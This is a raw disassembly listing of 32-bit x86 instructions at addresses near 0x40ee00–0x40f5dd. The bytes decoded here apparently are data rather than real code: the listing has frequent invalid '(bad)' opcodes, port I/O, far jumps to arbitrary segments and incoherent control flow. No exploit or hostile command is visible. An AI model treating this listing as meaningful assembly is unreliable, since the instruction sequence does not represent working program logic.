  40edfe:	sub    al,0xf7
  40ee00:	scas   eax,DWORD PTR es:[edi]
  40ee01:	cmp    al,0xe6
  40ee03:	inc    ebx
  40ee04:	mov    dl,0x7c
  40ee06:	(bad)  
  40ee07:	leave  
  40ee08:	(bad)  [ecx]
  40ee0a:	dec    ebx
  40ee0b:	or     cl,BYTE PTR [esi-0x26f2bc7]
  40ee11:	lods   eax,DWORD PTR ds:[esi]
  40ee12:	ss mov ecx,0x3fa99d8c
  40ee18:	or     esi,DWORD PTR [edx+eax*2-0x1c]
  40ee1c:	cmp    eax,0x9df5779f
  40ee21:	enter  0x306a,0x95
  40ee25:	sub    dl,BYTE PTR [edi-0x9]
  40ee28:	mov    DWORD PTR [ebx-0x5b],esi
  40ee2b:	sbb    ebp,esi
  40ee2d:	(bad)  
  40ee2e:	es xchg esp,eax
  40ee30:	mov    ebx,0x2e2b607b
  40ee35:	call   0xd853:0xb09a8174
  40ee3c:	lahf   
  40ee3d:	sbb    ah,ah
  40ee3f:	into   
  40ee40:	lea    esi,[edi]
  40ee42:	enter  0x9347,0xa
  40ee46:	cli    
  40ee47:	fdivr  QWORD PTR [esi+0x69f40c6a]
  40ee4d:	nop
  40ee4e:	xchg   ebp,eax
  40ee4f:	cmp    eax,0x2ce902c6
  40ee54:	inc    eax
  40ee55:	xor    al,0x43
  40ee57:	or     al,BYTE PTR [ebp+0x3412f2d8]
  40ee5d:	(bad)  
  40ee5e:	repz dec eax
  40ee60:	hlt    
  40ee61:	aam    0x6d
  40ee63:	dec    ebx
  40ee64:	outs   dx,BYTE PTR ds:[esi]
  40ee65:	loopne 0x40ee06
  40ee67:	xchg   ebp,eax
  40ee68:	and    eax,0xf8e566c6
  40ee6d:	or     ebx,DWORD PTR [ebx+0x5ecac2d4]
  40ee73:	xchg   BYTE PTR [edx],dh
  40ee75:	in     al,0x48
  40ee77:	dec    ebp
  40ee78:	sbb    DWORD PTR [ebx],0xffffffab
  40ee7b:	dec    eax
  40ee7c:	or     eax,0xac74030b
  40ee81:	adc    eax,0xd72e7b9d
  40ee86:	mov    edx,esp
  40ee88:	push   esi
  40ee89:	retf   
  40ee8a:	and    esp,eax
  40ee8c:	xchg   BYTE PTR [edi-0x13],cl
  40ee8f:	gs out 0x6d,al
  40ee92:	shl    DWORD PTR [ebx+0x79],1
  40ee95:	pop    ebx
  40ee96:	call   0x7ab7:0x75be9421
  40ee9d:	sub    al,0xfb
  40ee9f:	test   DWORD PTR [ecx],eax
  40eea1:	adc    bl,BYTE PTR [edi+edi*1-0x146ef3bf]
  40eea8:	mov    bh,0xf1
  40eeaa:	and    BYTE PTR [edi+0x1577ccb],dh
  40eeb0:	add    al,0xb3
  40eeb2:	sbb    bh,al
  40eeb4:	or     edx,DWORD PTR [eax+0x290ab4cc]
  40eeba:	sbb    eax,0x23e80cc0
  40eebf:	lock mov ch,0x40
  40eec2:	in     al,0xb
  40eec4:	pop    eax
  40eec5:	sub    BYTE PTR [ebx-0x6bcaa1fc],ah
  40eecb:	adc    esi,DWORD PTR [ecx+0x21]
  40eece:	addr16 jp 0x40ee77
  40eed1:	cs sub al,0xce
  40eed4:	sub    eax,0x64fbb834
  40eed9:	outs   dx,BYTE PTR ds:[esi]
  40eeda:	cld    
  40eedb:	in     eax,dx
  40eedc:	jle    0x40ef08
  40eede:	and    dh,bh
  40eee0:	sbb    BYTE PTR [ecx],dh
  40eee2:	and    DWORD PTR [edi+0x36bb85bd],esi
  40eee8:	sti    
  40eee9:	push   edx
  40eeea:	sbb    DWORD PTR [edi+ebx*1+0x2cce25f0],ecx
  40eef1:	add    al,0xa7
  40eef3:	jmp    0xd385:0x131756fb
  40eefa:	test   DWORD PTR [esi],ebx
  40eefc:	dec    edx
  40eefd:	pop    ecx
  40eefe:	mov    ebp,ebp
  40ef00:	pop    ebx
  40ef01:	mov    dh,BYTE PTR ds:0x9feec02b
  40ef07:	lahf   
  40ef08:	(bad)
  40ef0b:	mov    al,0x36
  40ef0d:	pop    es
  40ef0e:	repz mov dl,0xe3
  40ef11:	fs stos DWORD PTR es:[edi],eax
  40ef13:	xchg   edi,eax
  40ef14:	call   0xb5c7:0x4f75e4
  40ef1b:	xchg   edx,eax
  40ef1c:	and    DWORD PTR [edi-0x28],edx
  40ef1f:	sub    DWORD PTR [edi+0x13],ebp
  40ef22:	ss jecxz 0x40ef0c
  40ef25:	sahf   
  40ef26:	jns    0x40ef42
  40ef28:	push   ebp
  40ef29:	xchg   ebx,eax
  40ef2a:	mov    ch,0x5c
  40ef2c:	outs   dx,DWORD PTR ds:[esi]
  40ef2d:	push   ecx
  40ef2e:	sti    
  40ef2f:	fstp   QWORD PTR [esi-0x10]
  40ef32:	(bad)  
  40ef33:	xlat   BYTE PTR ds:[ebx]
  40ef34:	pop    ebp
  40ef35:	adc    al,0x89
  40ef37:	cs adc dh,bl
  40ef3a:	jecxz  0x40ef13
  40ef3c:	(bad)  
  40ef3e:	js     0x40ef6b
  40ef40:	dec    esp
  40ef41:	ror    BYTE PTR [eax],1
  40ef43:	enter  0xb59f,0x9f
  40ef47:	dec    BYTE PTR [esi]
  40ef49:	rcl    al,0xca
  40ef4c:	outs   dx,DWORD PTR ds:[esi]
  40ef4d:	stos   DWORD PTR es:[edi],eax
  40ef4e:	imul   edx,DWORD PTR [ecx-0x17],0x7b37f97
  40ef55:	test   al,0xdd
  40ef57:	xchg   edx,eax
  40ef58:	sar    BYTE PTR [edi],cl
  40ef5a:	outs   dx,BYTE PTR ds:[esi]
  40ef5b:	adc    eax,0xbdc171f9
  40ef60:	jecxz  0x40ef51
  40ef62:	fwait
  40ef63:	adc    DWORD PTR [eax+0x6],esi
  40ef66:	rep outs dx,DWORD PTR ds:[esi]
  40ef68:	adc    DWORD PTR [esi+0x7e529c88],eax
  40ef6e:	imul   ebp,DWORD PTR [eax],0x1a87da4c
  40ef74:	inc    ebp
  40ef75:	fwait
  40ef76:	dec    ebp
  40ef77:	loopne 0x40ef4e
  40ef79:	xchg   ebp,eax
  40ef7a:	sub    BYTE PTR [ecx],0x38
  40ef7d:	neg    BYTE PTR [ebp+0x45]
  40ef80:	adc    eax,0x261bdf21
  40ef85:	jmp    0x40ef16
  40ef87:	push   es
  40ef88:	cmp    BYTE PTR [edx-0x97b0b4f],bh
  40ef8e:	jmp    0x2aa6db68
  40ef93:	xchg   ebp,eax
  40ef94:	ficom  DWORD PTR [edi+edx*4+0x12]
  40ef98:	out    dx,al
  40ef99:	mov    WORD PTR [esi],ds
  40ef9b:	std    
  40ef9c:	pop    esp
  40ef9d:	jmp    0x8695c9cf
  40efa2:	into   
  40efa3:	xor    al,BYTE PTR [esi]
  40efa5:	mov    al,BYTE PTR [edi+ecx*4+0x22f8e34c]
  40efac:	inc    ebx
  40efad:	xor    cl,BYTE PTR [edi+eax*4-0x13505c67]
  40efb4:	mov    WORD PTR [ebx-0x3a935f19],ds
  40efba:	sbb    ebx,edi
  40efbc:	scas   eax,DWORD PTR es:[edi]
  40efbd:	xor    eax,0xe1a829d7
  40efc2:	mov    dl,0xe8
  40efc4:	fld    DWORD PTR [ecx+0x7b99bc6b]
  40efca:	lods   al,BYTE PTR ds:[esi]
  40efcb:	fucomp st(2)
  40efcd:	jo     0x40f00a
  40efcf:	das    
  40efd0:	cli    
  40efd1:	sbb    ebp,DWORD PTR [ebx-0x6716f2d3]
  40efd7:	lods   al,BYTE PTR ds:[esi]
  40efd8:	cld    
  40efd9:	ins    DWORD PTR es:[edi],dx
  40efda:	pusha  
  40efdb:	inc    DWORD PTR [eax]
  40efdd:	mov    ds:0xbb560e55,eax
  40efe2:	loopne 0x40ef6f
  40efe4:	lods   eax,DWORD PTR ds:[esi]
  40efe5:	ins    DWORD PTR es:[edi],dx
  40efe6:	adc    DWORD PTR [eax+0x4f],edx
  40efe9:	mov    gs,WORD PTR [edi-0x586e5c73]
  40efef:	sub    dl,BYTE PTR [ebx]
  40eff1:	ds ffreep st(0)
  40eff4:	(bad)  
  40eff5:	jle    0x40f01a
  40eff7:	mov    dl,0x1d
  40eff9:	adc    edx,DWORD PTR [ecx+0x65]
  40effc:	es push ecx
  40effe:	inc    edi
  40efff:	and    al,0x69
  40f001:	pop    esi
  40f002:	inc    edi
  40f003:	or     ch,BYTE PTR [ecx-0x7b]
  40f006:	mov    cl,0x92
  40f008:	ss xchg ebp,eax
  40f00a:	in     al,dx
  40f00b:	(bad)  
  40f00d:	retf   
  40f00e:	loope  0x40efad
  40f010:	and    ebx,DWORD PTR [ebx-0x2774673c]
  40f016:	(bad)  
  40f018:	inc    ecx
  40f019:	ss push 0x7e
  40f01c:	mov    bl,0xb6
  40f01e:	jecxz  0x40f03f
  40f020:	and    ch,BYTE PTR [esi-0x50]
  40f023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f024:	xor    eax,0x58eabc45
  40f029:	out    dx,eax
  40f02a:	mov    bh,0x7c
  40f02c:	out    0x7a,eax
  40f02e:	sbb    edx,esp
  40f030:	rcr    cl,cl
  40f032:	pavgw  mm6,QWORD PTR [edx-0x5b8528fd]
  40f039:	stos   DWORD PTR es:[edi],eax
  40f03a:	adc    dl,BYTE PTR [ebx]
  40f03c:	std    
  40f03d:	add    ch,al
  40f03f:	jbe    0x40f07e
  40f041:	ficomp WORD PTR [esi]
  40f043:	call   0xbb7a:0x860ea40f
  40f04a:	cmp    ecx,DWORD PTR [eax]
  40f04c:	fsubr  QWORD PTR [esi+0x1]
  40f04f:	(bad)  
  40f050:	(bad)  
  40f051:	lea    esp,[esp+edx*8-0x2f6dee79]
  40f058:	cdq    
  40f059:	hlt    
  40f05a:	jmp    0x8a9c:0x7f3a3c2a
  40f061:	retf   
  40f062:	jmp    0x5a17a364
  40f067:	shr    BYTE PTR [ecx-0x68],cl
  40f06a:	(bad)  
  40f06e:	cdq    
  40f06f:	test   DWORD PTR [ebx+eiz*8],ecx
  40f072:	sbb    al,0xbd
  40f074:	xchg   esi,eax
  40f075:	xchg   ebx,eax
  40f076:	scas   eax,DWORD PTR es:[edi]
  40f077:	pop    edx
  40f078:	dec    DWORD PTR [edx]
  40f07a:	mov    dh,0x9
  40f07c:	imul   edx,DWORD PTR [edi*2+0x64956c1c],0x22
  40f084:	jge    0x40f04c
  40f086:	inc    edi
  40f087:	out    dx,eax
  40f088:	das    
  40f089:	scas   al,BYTE PTR es:[edi]
  40f08a:	cmp    edx,esi
  40f08c:	jbe    0x40f033
  40f08e:	(bad)  
  40f08f:	cmc    
  40f090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f091:	outs   dx,DWORD PTR ds:[esi]
  40f092:	lea    edx,[eax]
  40f094:	jno    0x40f0a3
  40f096:	and    ah,BYTE PTR [ebp+0x19]
  40f099:	jle    0x40f0e4
  40f09b:	je     0x40f109
  40f09d:	xor    eax,0x39a082df
  40f0a2:	cdq    
  40f0a3:	in     eax,dx
  40f0a4:	pop    es
  40f0a5:	cmpxchg esi,ebp
  40f0a8:	adc    dl,BYTE PTR [ebx-0x5b]
  40f0ab:	jne    0x40f0b9
  40f0ad:	push   esp
  40f0ae:	push   esp
  40f0af:	mov    ds:0x87bfd30e,al
  40f0b4:	fcom   st(5)
  40f0b6:	fdiv   QWORD PTR [eax+0x331ebc56]
  40f0bc:	jg     0x40f12e
  40f0be:	sub    BYTE PTR [ebp-0x727a047e],bh
  40f0c4:	dec    esp
  40f0c5:	cdq    
  40f0c6:	test   al,0x36
  40f0c8:	xor    eax,0xdf15f07e
  40f0cd:	add    eax,0xc34923d7
  40f0d2:	pop    ds
  40f0d3:	imul   BYTE PTR [edx-0x61]
  40f0d6:	imul   ecx,DWORD PTR [ebx],0xdaf75a2f
  40f0dc:	ss jmp 0x4116adff
  40f0e2:	mov    ecx,0x6260d265
  40f0e7:	loopne 0x40f0e7
  40f0e9:	shl    DWORD PTR [esi-0x390f0e9e],0x19
  40f0f0:	inc    ebp
  40f0f1:	and    al,0x2b
  40f0f3:	pushf  
  40f0f4:	popa   
  40f0f5:	mov    edx,0xeb43bc70
  40f0fa:	out    0x26,al
  40f0fc:	cmc    
  40f0fd:	mov    edi,0x614c95e8
  40f102:	pop    ebx
  40f103:	xchg   ecx,eax
  40f104:	dec    esi
  40f105:	rol    BYTE PTR [ecx+0x67e0523d],cl
  40f10b:	ds lock in al,dx
  40f10e:	xchg   esi,eax
  40f10f:	cmp    esp,eax
  40f111:	hlt    
  40f112:	push   edi
  40f113:	dec    esp
  40f114:	aad    0xb0
  40f116:	mov    edx,0xc4883261
  40f11b:	mov    ebp,0xa395a5f
  40f120:	jg     0x40f15a
  40f122:	loope  0x40f14a
  40f124:	lds    edi,FWORD PTR [eax-0x53]
  40f127:	mov    DWORD PTR [eax],edi
  40f129:	add    eax,0xeb886d40
  40f12e:	xchg   edi,eax
  40f12f:	pop    es
  40f130:	cmp    ah,bh
  40f132:	orps   xmm7,xmm1
  40f135:	cmp    BYTE PTR [ecx+0x51],0x33
  40f139:	cmp    esi,DWORD PTR [ebx+0x2e7768b8]
  40f13f:	fldcw  WORD PTR [esi]
  40f141:	and    eax,0x54dfc3a4
  40f146:	xor    eax,0x1e595b6b
  40f14b:	cmp    al,0x76
  40f14e:	addr16 cmp eax,0x99a0d8cf
  40f154:	adc    DWORD PTR [edi],edi
  40f156:	popf   
  40f157:	cmp    al,al
  40f159:	outs   dx,DWORD PTR ds:[esi]
  40f15a:	fstp   TBYTE PTR [edi-0x1808830a]
  40f160:	repnz sub ch,BYTE PTR [ecx+ebp*8-0x2c]
  40f165:	mov    BYTE PTR [ebp-0x1f],ch
  40f168:	jg     0x40f12f
  40f16a:	sbb    DWORD PTR [ebp+eax*4-0x58de1f71],eax
  40f171:	ins    DWORD PTR es:[edi],dx
  40f172:	jecxz  0x40f19b
  40f174:	pop    ecx
  40f175:	push   cs
  40f176:	iret   
  40f177:	(bad)  
  40f178:	mov    ebp,0x6e5597c0
  40f17d:	xchg   esp,eax
  40f17e:	mov    esp,0x2209e5da
  40f183:	sti    
  40f184:	test   eax,0xb85f572c
  40f189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f18a:	xor    BYTE PTR [edx],bh
  40f18c:	mov    ds:0xf66446af,al
  40f191:	add    DWORD PTR ds:[edi],eax
  40f194:	js     0x40f155
  40f196:	lock pushf 
  40f198:	cmp    al,0x41
  40f19a:	fsub   DWORD PTR [ebp+0x15ddf260]
  40f1a0:	or     ebp,ecx
  40f1a2:	div    DWORD PTR [ebp-0x84b136b]
  40f1a8:	clc    
  40f1a9:	push   ebx
  40f1aa:	pop    ebp
  40f1ab:	push   ebp
  40f1ac:	sbb    ebp,DWORD PTR [esi+0x20b04075]
  40f1b2:	stc    
  40f1b3:	push   eax
  40f1b4:	sbb    bl,BYTE PTR [esp+esi*2+0x68f8f89e]
  40f1bb:	jns    0x40f1d9
  40f1bd:	xor    DWORD PTR [ebx],edi
  40f1bf:	or     bl,BYTE PTR [eax-0x6d7b6359]
  40f1c5:	(bad)  
  40f1c6:	sub    BYTE PTR [ebp-0x26],dh
  40f1c9:	pop    esp
  40f1ca:	bound  esp,QWORD PTR [esi-0x5e]
  40f1cd:	mov    bl,0x53
  40f1cf:	or     eax,0xba82860f
  40f1d4:	sub    BYTE PTR [ecx-0x30],ah
  40f1d7:	scas   al,BYTE PTR es:[edi]
  40f1d8:	test   al,0xde
  40f1da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1db:	cld    
  40f1dc:	add    eax,0x6899fd5c
  40f1e1:	jae    0x40f1f2
  40f1e3:	and    esp,DWORD PTR [edi+0x7bce37a0]
  40f1e9:	enter  0x754e,0xa2
  40f1ed:	or     al,0x5a
  40f1ef:	jge    0x40f1cb
  40f1f1:	into   
  40f1f2:	(bad)  
  40f1f3:	aad    0xf4
  40f1f5:	iret   
  40f1f6:	stos   DWORD PTR es:[edi],eax
  40f1f7:	jb     0x40f18a
  40f1f9:	mov    WORD PTR gs:[ecx+0x57091bb8],?
  40f200:	sbb    al,0x2b
  40f202:	out    dx,eax
  40f203:	das    
  40f204:	mov    ds:0xdaa8bf2a,al
  40f209:	stos   BYTE PTR es:[edi],al
  40f20a:	inc    ebx
  40f20b:	adc    eax,0xc3d009b4
  40f210:	pop    edi
  40f211:	iret   
  40f212:	inc    ecx
  40f213:	and    BYTE PTR [edx-0x39a9c50f],ah
  40f219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f21a:	pop    ds
  40f21b:	test   al,0x3e
  40f21d:	xor    edx,ebp
  40f21f:	dec    esi
  40f220:	push   ebx
  40f221:	mov    ah,0x4
  40f223:	test   BYTE PTR [ecx],dh
  40f225:	adc    DWORD PTR [ebp+0x35],ebp
  40f228:	pop    ecx
  40f229:	push   ds
  40f22a:	loope  0x40f1fe
  40f22c:	pop    ebp
  40f22d:	push   esi
  40f22e:	mov    ebp,0x9b80032f
  40f233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f234:	jbe    0x40f22b
  40f236:	scas   eax,DWORD PTR es:[edi]
  40f237:	int    0x5c
  40f239:	ja     0x40f2af
  40f23b:	scas   eax,DWORD PTR es:[edi]
  40f23c:	(bad)  
  40f23d:	rcl    DWORD PTR [ebx-0x65633c21],1
  40f243:	dec    esi
  40f244:	sub    al,0xaf
  40f246:	dec    edx
  40f247:	pop    ss
  40f248:	pusha  
  40f249:	sti    
  40f24a:	xchg   ecx,eax
  40f24b:	mov    bl,0x15
  40f24d:	dec    ebp
  40f24e:	bound  edx,QWORD PTR [ecx-0x515c1ce9]
  40f254:	ins    BYTE PTR es:[edi],dx
  40f255:	sbb    ebx,ebx
  40f257:	adc    DWORD PTR [ebx-0x70],0x4df697d4
  40f25e:	jecxz  0x40f205
  40f260:	hlt    
  40f261:	jle    0x40f216
  40f263:	pop    esp
  40f264:	dec    edi
  40f265:	sub    ebp,DWORD PTR [eax-0x76]
  40f268:	dec    ebp
  40f269:	sub    DWORD PTR [edi-0x3f5ea38a],0xbf20cedc
  40f273:	pop    ebx
  40f274:	fstp   DWORD PTR [ecx+0x48]
  40f277:	cmp    al,0x78
  40f279:	dec    ebx
  40f27a:	mov    al,0x38
  40f27c:	jns    0x40f2c6
  40f27e:	adc    ah,0x97
  40f281:	cmp    al,BYTE PTR [ecx-0x1f]
  40f284:	xchg   edi,eax
  40f285:	mov    dh,0x75
  40f287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f288:	adc    eax,0x4745cc56
  40f28d:	xchg   edx,eax
  40f28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f28f:	out    dx,eax
  40f290:	pusha  
  40f291:	jle    0x40f264
  40f293:	cmp    edi,DWORD PTR [ecx+0x7872ade8]
  40f299:	jmp    0x7c1d:0x153a5b5f
  40f2a0:	lahf   
  40f2a1:	xchg   ebx,eax
  40f2a2:	push   ds
  40f2a3:	sbb    DWORD PTR [ebx+0x5c0f647a],edx
  40f2a9:	mov    bl,dh
  40f2ab:	aaa    
  40f2ac:	in     al,0xdd
  40f2ae:	xor    esi,DWORD PTR [edx+0xf]
  40f2b1:	sahf   
  40f2b2:	add    esp,DWORD PTR [ebp+0x37]
  40f2b5:	dec    eax
  40f2b6:	mov    ds:0xa006de4,eax
  40f2bb:	mov    ebp,0x6617a058
  40f2c0:	jae    0x40f304
  40f2c2:	xor    BYTE PTR [ecx+0x8],ch
  40f2c5:	into   
  40f2c6:	mov    ecx,0xde20e560
  40f2cb:	adc    BYTE PTR fs:[ebx-0xc],ah
  40f2cf:	dec    ecx
  40f2d0:	retf   0xda06
  40f2d3:	adc    eax,0xd417b067
  40f2d8:	mov    esi,0x951b2765
  40f2dd:	pop    esp
  40f2de:	adc    dl,BYTE PTR [edx]
  40f2e0:	pusha  
  40f2e1:	dec    BYTE PTR [edi+eiz*1+0x6ede7977]
  40f2e8:	xor    ch,BYTE PTR [edi+0x6a]
  40f2eb:	dec    eax
  40f2ec:	sub    eax,0xe28c7ab4
  40f2f1:	jmp    0x40f333
  40f2f3:	mov    WORD PTR [edi-0x5676dec1],?
  40f2f9:	jg     0x40f344
  40f2fb:	push   esi
  40f2fc:	lahf   
  40f2fd:	les    ecx,FWORD PTR [ebp+0x4a]
  40f300:	jb     0x40f33f
  40f302:	pop    es
  40f303:	jmp    DWORD PTR [edi]
  40f305:	mov    edi,0xf77fa465
  40f30a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f30b:	cmp    DWORD PTR [edx+eax*2-0x5c],0xffffff9e
  40f310:	add    eax,0x501ca01
  40f315:	out    0xc8,al
  40f317:	sub    DWORD PTR [edx-0x49],ecx
  40f31a:	nop
  40f31b:	dec    DWORD PTR [edx+0x4305f02f]
  40f321:	cwde   
  40f322:	xlat   BYTE PTR ds:[ebx]
  40f323:	pop    edi
  40f324:	and    eax,0x1c94ac9a
  40f329:	dec    ebx
  40f32a:	or     dh,bl
  40f32c:	fld    DWORD PTR [ebp+0x31860bad]
  40f332:	(bad)  
  40f333:	mov    gs,eax
  40f335:	inc    ebx
  40f336:	mov    dh,0xa9
  40f338:	jecxz  0x40f37f
  40f33a:	cmc    
  40f33b:	and    ebp,DWORD PTR [eax+0x7e]
  40f33e:	ja     0x40f329
  40f340:	adc    esi,DWORD PTR [edi]
  40f342:	out    0x6a,eax
  40f344:	in     al,dx
  40f345:	pop    es
  40f346:	int    0xf0
  40f348:	femms  
  40f34a:	sub    al,0x6f
  40f34c:	mov    edx,0xf7f115aa
  40f351:	lahf   
  40f352:	iret   
  40f353:	clc    
  40f354:	mov    es,WORD PTR [ebp+ecx*8-0xd3242d0]
  40f35b:	clc    
  40f35c:	adc    eax,0x218bc709
  40f361:	stos   BYTE PTR es:[edi],al
  40f362:	and    al,0xa6
  40f364:	retf   0x559
  40f367:	pop    ds
  40f368:	mov    ch,0x86
  40f36a:	pushf  
  40f36b:	xchg   DWORD PTR [ebp-0x4160a53d],eax
  40f371:	xchg   esi,eax
  40f372:	sahf   
  40f373:	adc    DWORD PTR [ebx+0x3b],0xc86764dd
  40f37a:	pop    edi
  40f37b:	mov    esp,0xbe5ca36
  40f380:	pop    esi
  40f381:	or     BYTE PTR [ebx+0x65],bl
  40f384:	lods   eax,DWORD PTR ds:[esi]
  40f385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f386:	mov    bl,0x68
  40f388:	mov    ebx,es
  40f38a:	add    al,0xcb
  40f38c:	lds    esp,FWORD PTR [esi+ecx*2+0x41]
  40f390:	and    BYTE PTR [edx+eax*1],bh
  40f393:	or     DWORD PTR [ebx+0x30a4ba22],0xbb51ea68
  40f39d:	ss int3 
  40f39f:	jmp    0xe6ee:0xdc0c8943
  40f3a6:	mov    dh,0x60
  40f3a8:	add    DWORD PTR [edx-0x1c],edx
  40f3ab:	cmp    ebx,edi
  40f3ad:	jae    0x40f409
  40f3af:	call   0x5a04:0x73980fc6
  40f3b6:	add    BYTE PTR [ebp+0x36],bh
  40f3b9:	mov    esi,0x60f3bf5f
  40f3be:	xor    esi,DWORD PTR [ebp-0x3b]
  40f3c1:	and    al,0x68
  40f3c3:	mov    dh,0xee
  40f3c5:	out    dx,eax
  40f3c6:	xchg   esi,eax
  40f3c7:	in     al,dx
  40f3c8:	add    DWORD PTR [edx],eax
  40f3ca:	jns    0x40f35f
  40f3cc:	leave  
  40f3cd:	(bad)  
  40f3cf:	out    0x18,eax
  40f3d1:	stc    
  40f3d2:	add    esi,DWORD PTR ds:0x2def8ce6
  40f3d8:	mov    edi,0xe6c071f3
  40f3dd:	push   eax
  40f3de:	daa    
  40f3df:	fmul   DWORD PTR [edx+ecx*2-0x4f6ba8da]
  40f3e6:	cwde   
  40f3e7:	sti    
  40f3e8:	pop    esp
  40f3e9:	pop    ebx
  40f3ea:	xor    edi,esp
  40f3ec:	in     al,dx
  40f3ed:	cmp    DWORD PTR [ebx+0x25277b10],ecx
  40f3f3:	js     0x40f3c4
  40f3f5:	pushf  
  40f3f6:	and    al,0xce
  40f3f8:	jmp    0x1655:0x2e561180
  40f3ff:	xchg   ecx,eax
  40f400:	dec    ebx
  40f401:	shl    ch,cl
  40f403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f404:	dec    eax
  40f405:	mov    ah,0xa5
  40f407:	jle    0x40f3d7
  40f409:	mov    cl,0x38
  40f40b:	pop    es
  40f40c:	cmp    eax,0x295b15d1
  40f411:	xor    eax,0xfb364c36
  40f416:	call   0x6be7c542
  40f41b:	ds cmc 
  40f41d:	inc    esi
  40f41e:	adc    BYTE PTR ds:0x2b678915,ah
  40f424:	jl     0x40f490
  40f426:	ins    DWORD PTR es:[edi],dx
  40f427:	xchg   ebx,eax
  40f428:	mov    ecx,0x4f8a08e
  40f42d:	pop    edi
  40f42e:	mov    ecx,0x6821a10
  40f433:	aaa    
  40f434:	cmp    BYTE PTR [edi],dh
  40f436:	lods   al,BYTE PTR ds:[esi]
  40f437:	xor    ebx,ecx
  40f439:	and    esp,ebx
  40f43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f43c:	sbb    esi,edi
  40f43e:	jp     0x40f41c
  40f440:	adc    edi,0xffffffba
  40f443:	mov    DWORD PTR [eax+ebx*8+0x586de5e0],eax
  40f44a:	test   eax,0x443e9f43
  40f44f:	pop    esi
  40f450:	mov    BYTE PTR [edi+0x3a72cca6],0xe3
  40f457:	mov    dh,0x74
  40f459:	push   cs
  40f45a:	retf   0xdd08
  40f45d:	fst    QWORD PTR [ebp+eax*4+0x27]
  40f461:	sar    eax,cl
  40f463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f464:	adc    DWORD PTR [ebp-0x5d],ecx
  40f467:	cmp    BYTE PTR ds:0x88684c94,bl
  40f46d:	sbb    dl,ah
  40f46f:	fwait
  40f470:	std    
  40f471:	push   ebp
  40f472:	inc    eax
  40f473:	jmp    0xaa96:0x99684a1d
  40f47a:	icebp  
  40f47b:	xchg   DWORD PTR [edx-0x4f],ebp
  40f47e:	(bad)  
  40f47f:	sar    BYTE PTR [ebx+0xb],1
  40f482:	enter  0x14fc,0x0
  40f486:	push   es
  40f487:	daa    
  40f488:	popf   
  40f489:	scas   al,BYTE PTR es:[edi]
  40f48a:	into   
  40f48b:	sub    eax,0x1f285f02
  40f490:	shl    DWORD PTR [edi+ebp*4+0x3e],1
  40f494:	loop   0x40f4ef
  40f496:	mov    ebp,0x33
	...
  40f513:	add    ah,dh
  40f515:	test   BYTE PTR [eax-0x6b],cl
  40f518:	js     0x40f4f7
  40f51a:	std    
  40f51b:	in     eax,0xbe
  40f51d:	mov    bh,0x36
  40f51f:	ds jmp 0xa1:0x8d0d55d4
  40f527:	add    BYTE PTR [edi+eax*1+0x0],ch
  40f52b:	add    BYTE PTR [ebx-0x4b],cl
  40f52e:	inc    ecx
  40f52f:	out    dx,eax
  40f530:	retf   
  40f531:	loopne 0x40f4c7
  40f533:	dec    esi
  40f534:	mov    ebx,0x720217d9
  40f539:	push   ss
  40f53a:	dec    edx
  40f53b:	(bad)  
  40f53c:	mov    ch,0x45
  40f53e:	daa    
  40f53f:	cdq    
  40f540:	(bad)  
  40f541:	lods   eax,DWORD PTR ds:[esi]
  40f542:	mov    ebp,0x2ae22d1f
  40f547:	neg    ah
  40f549:	daa    
  40f54a:	in     eax,0x73
  40f54c:	push   0x5eafe005
  40f551:	sbb    al,bh
  40f553:	or     DWORD PTR [edi-0x6e],esi
  40f556:	push   eax
  40f557:	outs   dx,BYTE PTR ds:[esi]
  40f558:	sub    eax,0xffffffc4
  40f55b:	pop    ebx
  40f55c:	call   0xd1a:0x12b35fd6
  40f563:	push   ss
  40f564:	sbb    al,0xca
  40f566:	mov    bl,0xeb
  40f568:	retf   
  40f569:	lods   eax,DWORD PTR ds:[esi]
  40f56a:	xlat   BYTE PTR ds:[ebx]
  40f56b:	dec    ebx
  40f56c:	inc    esp
  40f56d:	inc    DWORD PTR [ebx-0x2b]
  40f570:	ror    BYTE PTR [esi+eax*4+0x72],0x5d
  40f575:	fisttp WORD PTR [edx+0x27]
  40f578:	xchg   edi,eax
  40f579:	sbb    ecx,DWORD PTR [ebx-0x74f4a8a4]
  40f57f:	jecxz  0x40f532
  40f581:	xor    esp,edi
  40f583:	xchg   ebx,eax
  40f584:	mov    dh,0x0
  40f586:	mov    ds:0x4f285e0,eax
  40f58b:	stos   BYTE PTR es:[edi],al
  40f58c:	(bad)  
  40f58e:	popf   
  40f58f:	jp     0x40f609
  40f591:	dec    eax
  40f592:	cmp    dl,dh
  40f594:	addr16 dec ebp
  40f596:	sub    eax,0xc2379b22
  40f59b:	sbb    DWORD PTR [ecx],esi
  40f59d:	push   DWORD PTR [ebx]
  40f59f:	arpl   WORD PTR [eax-0x8d9835f],bp
  40f5a5:	adc    eax,0x1f5f3e82
  40f5aa:	pushf  
  40f5ab:	inc    ebx
  40f5ac:	cs pop edx
  40f5ae:	lods   al,BYTE PTR ds:[esi]
  40f5af:	icebp  
  40f5b0:	jg     0x40f539
  40f5b2:	add    BYTE PTR [ebx],ch
  40f5b4:	imul   ebp,DWORD PTR ss:[edi+eiz*1+0x348149e1],0xffffff84
  40f5bd:	adc    ah,BYTE PTR [ebx+0x36896d96]
  40f5c3:	pop    es
  40f5c4:	mov    edi,0x31c64e7d
  40f5c9:	popf   
  40f5ca:	in     eax,dx
  40f5cb:	test   esi,esi
  40f5cd:	mov    al,BYTE PTR [edi-0x3]
  40f5d0:	pop    ebp
  40f5d1:	jl     0x40f564
  40f5d3:	add    eax,0x5d7eb245
  40f5d8:	hlt    
  40f5d9:	enter  0x1e28,0xa7
  40f5dd:	xor    eax,0x65b3867b
